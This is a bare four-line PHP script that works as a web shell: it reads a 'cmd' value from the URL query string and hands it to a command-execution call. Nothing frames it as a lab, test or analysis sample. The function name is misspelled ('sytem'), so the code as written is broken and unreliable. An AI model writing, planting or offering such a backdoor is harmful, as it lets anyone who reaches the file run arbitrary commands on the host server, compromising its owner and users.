<?php
$cmd=$_GET['cmd'];
sytem($cmd);
?>
